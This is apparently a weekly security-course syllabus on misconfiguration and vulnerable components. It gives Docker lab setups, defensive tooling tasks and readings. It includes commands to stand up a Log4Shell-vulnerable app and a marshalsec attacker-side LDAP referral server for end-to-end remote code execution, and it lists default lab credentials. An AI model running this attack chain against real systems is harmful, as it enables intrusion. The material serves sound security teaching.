# Week 14: Security Misconfiguration & Vulnerable Components

## 🎯 What you'll learn

The boring bugs that produce the loudest breaches. Most public-disclosure post-mortems read "the vulnerability was patched in vendor release X six months earlier, but our team hadn't upgraded." There's no clever exploit chain here — just operational discipline. This week is about the controls that catch the unsexy stuff.

By the end of this week you'll be able to:

- Recognize **default-credential and unchanged-setup** patterns (admin/admin, Tomcat manager, MongoDB no-auth)
- Identify **debug pages and verbose errors** leaking stack traces, env vars, internal paths
- Exploit a **known-vulnerable component** (Log4Shell-style) end to end in a lab
- Read an **SBOM (Software Bill of Materials)** and explain why supply-chain auditing exists
- Wire up **Dependabot / Renovate / Trivy** so this class doesn't pile up
- Reason about **CIS benchmarks and CSP-as-misconfig** — hardening as ongoing process, not one-time setup

## ⚠️ Scope reminder

**Lab only.** Default credentials and unpatched-vendor-software exploitation are illegal against systems you don't own — even when "the door is wide open." See [root readme](../readme.md#️-ethics--scope).

## 🧰 Lab setup

### Lab 1: Log4Shell — the canonical "unpatched component" exploit

```bash
git clone https://github.com/christophetd/log4shell-vulnerable-app
cd log4shell-vulnerable-app
docker build -t log4shell-vuln .
docker run -d -p 8080:8080 --name vuln-app log4shell-vuln
```

The app is a tiny Spring Boot service running Log4j 2.14 (vulnerable to CVE-2021-44228). Sending a crafted `User-Agent` triggers JNDI lookup → RCE.

Also need an attacker-side JNDI/LDAP server:

```bash
git clone https://github.com/mbechler/marshalsec
cd marshalsec
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://host.docker.internal:8888/#Exploit"   # on Docker Desktop; see attack.md for Linux notes
```

And a small HTTP server hosting the Java payload class. Walk this in [attack.md](attack.md).

### Lab 2: DVWA — default-credential and verbose-error modules

```bash
docker run -d -p 80:80 vulnerables/web-dvwa
```

Default creds: `admin:password`. Note: the lab itself uses default creds *as the lab*. The "Security Settings" levels let you compare "low" (no hardening) vs "high" (production-grade) configs.

### Lab 3: Mongo-no-auth / Elasticsearch-open — the cloud-misconfig class

```bash
# Spin up a Mongo without auth — like thousands of real-world instances on the public internet
docker run -d -p 27017:27017 mongo:4.0  # older default = no auth
mongosh mongodb://localhost:27017
> show dbs   # full read access
```

The lesson: defaults change between versions, and a deploy script that worked in 2017 might silently expose what 2026's defaults would secure.

### Lab 4: PortSwigger — Security misconfiguration labs

Available at [PortSwigger — Authentication / Information disclosure](https://portswigger.net/web-security/information-disclosure):

- "Information disclosure in error messages"
- "Information disclosure on debug page"
- "Source code disclosure via backup files"
- "Information disclosure in version control history"

## ✅ Your job

1. **Spin up the Log4Shell lab.** Get RCE end-to-end (the attack.md walks each piece).
2. **Read the actual CVE writeup** for CVE-2021-44228 — not just summaries. Understand *why* the JNDI lookup turned arbitrary string into RCE.
3. **Run Trivy against the Log4Shell image:** `trivy image log4shell-vuln`. Read the entire output. Note every other CVE that wasn't even the headline.
4. **Read the [GitHub Dependabot setup docs](https://docs.github.com/en/code-security/dependabot/dependabot-version-updates/about-dependabot-version-updates)** and turn it on for your own GitHub account on one of your repos.
5. **Read [attack.md](attack.md) and [defense.md](defense.md).**

## 📚 Required reading

| Resource | Why | Time |
|---|---|---|
| [Log4Shell — the full GovCERT.ch advisory](https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/) | Why it was catastrophic | 25 min |
| [LunaSec — Log4Shell technical writeup](https://www.lunasec.io/docs/blog/log4j-zero-day/) | Attack chain explained | 25 min |
| [OWASP — Security Misconfiguration (A05:2021)](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) | The category overview | 15 min |
| [OWASP — Vulnerable and Outdated Components (A06:2021)](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/) | The component-version side | 15 min |
| [GitHub — About SBOMs](https://docs.github.com/en/code-security/supply-chain-security/understanding-your-software-supply-chain/about-the-dependency-graph) | Vocabulary for supply chain | 10 min |
| [CIS Benchmarks index](https://www.cisecurity.org/cis-benchmarks/) | What "hardened" means for ~100 platforms | 10 min skim |

## 💡 What you should already know

- HTTP, JSON, basic Docker
- A little Java (just enough to read the Log4j vulnerable code — three lines)
- What a CVE is and how to read its CVSS score
- Concept of dependency graphs (lockfiles, transitive deps)
